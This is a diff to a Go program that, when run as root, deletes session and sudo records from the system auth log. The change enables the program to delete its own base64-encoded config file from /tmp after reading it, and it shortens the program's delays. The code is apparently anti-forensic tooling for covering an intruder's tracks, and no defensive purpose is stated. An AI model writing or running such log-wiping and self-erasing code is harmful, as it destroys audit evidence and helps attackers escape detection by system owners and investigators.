@@ -82,21 +82,21 @@ var conf vars.Config
 func init() {
 
 	ReadTomlFile()
-	if false { //<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,//TODO Remove False
-		os.Remove("config.toml")
-	}
+
+	os.Remove("/tmp/config.toml")
+	os.Remove(conf.Flags.PreFile)
 
 }
 
 func main() {
 
-	time.Sleep(5 * time.Second)
+	time.Sleep(1 * time.Second)
 
 	euid := os.Geteuid()
 	if euid == 0 {
 		authlog.DeleteSessionAndSudoeSyslogAuthlog(conf, vars.AUTH_LOG)
 		fmt.Println("HERE")
-		time.Sleep(10 * time.Second)
+		time.Sleep(2 * time.Second)
 		fmt.Println(conf)
 
 	}
@@ -106,9 +106,10 @@ func main() {
 }
 
 func ReadTomlFile() {
-	x := check.OpenAndReadFiles("config.toml")
+	x := check.OpenAndReadFiles("/tmp/config.toml")
 	decodedToml, err := base64.StdEncoding.DecodeString(string(x))
 	if err != nil {
+		check.Check("Error decoding base64 TOML:", err)
 		fmt.Println("Error decoding base64 TOML:", err)
 		return
 	}
